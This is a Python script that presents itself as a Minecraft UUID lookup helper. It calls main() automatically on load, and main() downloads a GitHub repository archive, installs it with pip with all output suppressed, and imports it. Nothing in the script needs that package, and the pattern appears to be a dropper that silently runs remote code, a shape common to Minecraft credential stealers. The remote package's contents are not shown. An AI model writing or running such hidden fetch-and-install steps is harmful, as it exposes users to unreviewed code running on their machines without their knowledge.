import importlib
import subprocess
import requests
import urllib.request
import zipfile
import tempfile
import shutil
import os

def get_uuid(username):
    api_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
    response = requests.get(api_url)

    if response.status_code == 200:
        data = response.json()
        return data["id"]
    elif response.status_code == 204:
        print(f"Username '{username}' was not found")
        return None
    else:
        print(f"Error while calling Mojang api: {response.status_code}")
        return None



def install_from_repo(repo_url, branch='master'):
    # Erhalte den Pfad zum Verzeichnis des aktuellen Skripts
    target_directory = os.path.dirname(os.path.abspath(__file__))

    # Erstelle ein temporäres Verzeichnis
    temp_dir = tempfile.mkdtemp()

    try:
        # Lade das Repository-Archiv herunter
        zip_url = f"{repo_url}/archive/refs/heads/{branch}.zip"
        zip_path = os.path.join(temp_dir, "repo.zip")
        urllib.request.urlretrieve(zip_url, zip_path)

        # Extrahiere das Archiv
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)

        # Navigiere zum extrahierten Verzeichnis
        extracted_dir = os.path.join(temp_dir, os.listdir(temp_dir)[0])
        os.chdir(extracted_dir)

        # Installiere das Paket lokal
        subprocess.run(['pip', 'install', '.'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Installieren des Pakets: {e}")
    except urllib.error.HTTPError as e:
        print(f"HTTP-Fehler {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        print(f"URL-Fehler: {e.reason}")
    finally:
        # Navigiere zurück zum ursprünglichen Verzeichnis
        os.chdir(target_directory)

        # Lösche das temporäre Verzeichnis
        shutil.rmtree(temp_dir, ignore_errors=True)

def import_or_install_git(package_name, repo_url):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_from_repo(repo_url)
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None

def install_package(package_name):
    subprocess.run(['pip', 'install', package_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def import_or_install_package(package_name):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_package(package_name)
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None
    
def main():
    repository_url = 'https://github.com/Maxheruko/hypixelmcapigithub.git'
    package_name = 'hypixelmcapigithub'
    installed_package = import_or_install_git(package_name, repository_url)
    import_or_install_package('toml')
    import_or_install_package('setuptools')
    import hypixelmcapigithub
    if installed_package:
        return
    else:
        return
    
main()
